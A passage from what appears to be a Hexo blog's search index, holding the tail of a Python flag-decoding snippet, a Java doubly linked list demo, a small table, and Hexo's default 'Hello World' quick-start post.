class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])-i)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>Java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>        Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>        Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>        java.next=rw;<br>        rw.next=urm;<br>        <br>        urm.prev=rw;<br>        rw.prev=java;<br>        <br>        Node first=java;<br>        Node last=urm;<br>        <br>        Node temp=first;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.next;<br>        &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>        <br>    &#125;<br>    <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> + <span class="hljs-string">&quot;item=&quot;</span> + item + <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>表格</p><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td><td>9</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/06/hello-world/"/>
    <url>/2024/11/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
